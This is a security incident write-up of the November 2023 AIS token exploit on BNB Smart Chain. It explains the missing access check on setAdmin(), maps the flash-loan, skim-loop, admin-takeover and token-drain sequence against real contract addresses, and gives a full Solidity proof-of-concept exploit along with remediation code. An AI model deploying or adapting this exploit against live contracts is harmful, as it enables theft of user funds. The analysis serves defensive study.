# AIS Access Control Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | AIS Token |
| Date | 2023-11-02 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$61,000 USD |
| Attack Type | Flash Loan + setAdmin() Privilege Takeover + transferToken() (Flash Loan + Admin Takeover + Token Drain) |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x84f37F6cC75cCde5fE9bA99093824A11CfDc329D` |
| Attack Contract | `0xf6f60b0e83d9837c1f247c575c8583b1d085d351` |
| Vulnerable Contract | `0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7` (VulContract) |
| Fork Block | 33,916,687 |

## 2. Vulnerable Code Analysis

The `VulContract` in the AIS token ecosystem had no access control on its `setAdmin()` function, allowing anyone to become administrator. The attacker acquired a large amount of USDT via a PancakeSwap V3 flash loan, manipulated the AIS token price through a skim loop, then called `setAdmin(address(this))` to gain admin privileges and drained tokens via `transferToken()`.

```solidity
// Vulnerable pattern: no access control on setAdmin
contract VulContract {
    address public admin;

    // Vulnerable: anyone can call to change admin
    function setAdmin(address newAdmin) external {
        // require(msg.sender == admin, "Not admin") missing
        admin = newAdmin;
    }

    // Only admin can call, but bypassed because setAdmin is public
    function transferToken(address token, address to, uint256 amount) external {
        require(msg.sender == admin, "Not admin");
        IERC20(token).transfer(to, amount);
    }
}
```

**Vulnerability**: The `setAdmin()` function lacked a `require(msg.sender == admin)` check, allowing anyone to set themselves as administrator. The attacker then used `transferToken()` to drain the entire AIS token balance held in the contract.

### On-chain Original Code

Source: Bytecode decompiled

```solidity
// File: AIS_decompiled.sol
    function setAdmin(address account) external {}  // ❌

// ...

    function transferToken(address account, address recipient, uint256 shares) external {}  // ❌
```

## 3. Attack Flow

```
Attacker [0x84f37F6cC75cCde5fE9bA99093824A11CfDc329D]
  │
  ├─1─▶ PancakeSwap V3.flash(USDT 3,000,000)
  │      [Pool: 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]
  │      pancakeV3FlashCallback triggered
  │
  ├─2─▶ swap(USDT → AIS) via PancakeSwap Router
  │      [Router: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      USDT/AIS pair: 0x1219F2699893BD05FE03559aA78e0923559CF0cf
  │
  ├─3─▶ Repeated skim loop (100 iterations):
  │      AIS.transfer(usdt_ais, balance * 90%)
  │      AIS.transfer(usdt_ais, 0)  ← reentrancy/state update trigger
  │      usdt_ais.skim(address(this)) × 2
  │
  ├─4─▶ AIS.harvestMarket()
  │      [AIS: 0x6844Ef18012A383c14E9a76a93602616EE9d6132]
  │      Internal reward harvest
  │
  ├─5─▶ VulContract.setAdmin(address(this))
  │      [VulContract: 0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7]
  │      No access control → attacker gains admin
  │
  ├─6─▶ VulContract.transferToken(AIS, attacker, amount)
  │      90% of AIS held in VulContract drained
  │
  ├─7─▶ AIS.setSwapPairs(address(this))
  │      Swap pair replaced with attacker address
  │
  ├─8─▶ AIS → USDT reverse swap
  │
  └─9─▶ PancakeSwap V3 flash loan repaid + ~$61,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IAIS {
    function harvestMarket() external;
    function setSwapPairs(address pair) external;
}

interface VulContract {
    function setAdmin(address newAdmin) external;
    function transferToken(address token, address to, uint256 amount) external;
}

contract AISExploit {
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAIS AIS = IAIS(0x6844Ef18012A383c14E9a76a93602616EE9d6132);
    IUniswapV3Pool pool = IUniswapV3Pool(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    IUniswapV2Pair usdt_ais = IUniswapV2Pair(0x1219F2699893BD05FE03559aA78e0923559CF0cf);
    IUniswapV2Router router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    VulContract vulContract = VulContract(0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7);

    function testExploit() public {
        usdt.approve(address(router), type(uint256).max);
        IERC20(address(AIS)).approve(address(router), type(uint256).max);
        pool.flash(address(this), 3_000_000 ether, 0, new bytes(1));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {
        // USDT → AIS swap
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(AIS);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            3_000_000 ether, 0, path, address(this), block.timestamp
        );

        // Price manipulation via 100-iteration skim loop
        for (uint256 i = 0; i < 100; i++) {
            uint256 balance = IERC20(address(AIS)).balanceOf(address(this));
            IERC20(address(AIS)).transfer(address(usdt_ais), balance * 90 / 100);
            IERC20(address(AIS)).transfer(address(usdt_ais), 0);
            usdt_ais.skim(address(this));
            usdt_ais.skim(address(this));
        }

        // Additional state manipulation
        AIS.harvestMarket();

        // Exploit setAdmin vulnerability
        vulContract.setAdmin(address(this));
        uint256 amount = IERC20(address(AIS)).balanceOf(address(vulContract)) * 90 / 100;
        vulContract.transferToken(address(AIS), address(this), amount);

        // Replace swap pair then swap AIS → USDT
        AIS.setSwapPairs(address(this));
        IERC20(address(AIS)).transfer(address(usdt_ais), IERC20(address(AIS)).balanceOf(address(this)));
        IERC20(address(AIS)).transfer(address(usdt_ais), 0);

        path[0] = address(AIS);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(0, 0, path, address(this), block.timestamp);

        usdt.transfer(address(pool), 3_000_000 ether + fee0);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | No access control on setAdmin(), token drain after admin privilege takeover |
| Impact Scope | Entire AIS token balance held in VulContract |
| Explorer | [BSCscan](https://bscscan.com/address/0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7) |

## 6. Security Recommendations

```solidity
// Fix 1: Add access control to setAdmin
contract VulContract {
    address public admin;

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    // Only current admin can change admin
    function setAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Zero address");
        admin = newAdmin;
    }

    function transferToken(address token, address to, uint256 amount) external onlyAdmin {
        IERC20(token).transfer(to, amount);
    }
}

// Fix 2: Two-step admin transfer (timelock)
address public pendingAdmin;
uint256 public adminTransferTimestamp;

function proposeAdmin(address newAdmin) external onlyAdmin {
    pendingAdmin = newAdmin;
    adminTransferTimestamp = block.timestamp + 2 days;
}

function acceptAdmin() external {
    require(msg.sender == pendingAdmin, "Not pending admin");
    require(block.timestamp >= adminTransferTimestamp, "Timelock not expired");
    admin = pendingAdmin;
    pendingAdmin = address(0);
}

// Fix 3: Use OpenZeppelin Ownable
import "@openzeppelin/contracts/access/Ownable.sol";

contract VulContract is Ownable {
    function transferToken(address token, address to, uint256 amount) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
}
```

## 7. Lessons Learned

1. **Missing access control on setAdmin()**: Without a current-admin check on the admin change function, anyone can seize privileges. The OpenZeppelin `Ownable` pattern should be used as the default.
2. **Compound attack pattern**: This attack consisted of four stages — flash loan → skim loop → privilege takeover → token drain. Each stage requires a defensive layer to block it.
3. **100-iteration skim loop**: Repeating skim 100 times against a single pair is highly anomalous. Abnormal repetition patterns should be detected through on-chain monitoring.
4. **setSwapPairs privilege**: The AIS token contract's own `setSwapPairs()` function also had weak access control and was leveraged in the attack. All state-changing functions in token contracts require proper access control.